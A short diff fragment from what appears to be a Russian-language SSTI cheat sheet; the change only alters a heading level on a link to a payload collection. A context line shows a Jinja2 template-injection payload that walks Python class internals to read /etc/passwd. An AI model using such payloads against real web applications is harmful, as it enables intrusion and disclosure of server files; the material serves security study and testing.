@@ -75,7 +75,7 @@ __globals__ Ссылка на словарь, содержащий глобал�
 {{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
 ```
 
-## [!Все payloads](https://github.com/LostErr0r/Bestiary/tree/main/payloads/SSTI)
+# [!Все payloads](https://github.com/LostErr0r/Bestiary/tree/main/payloads/SSTI)
 
 # Cheet shet
 ### Jinja2
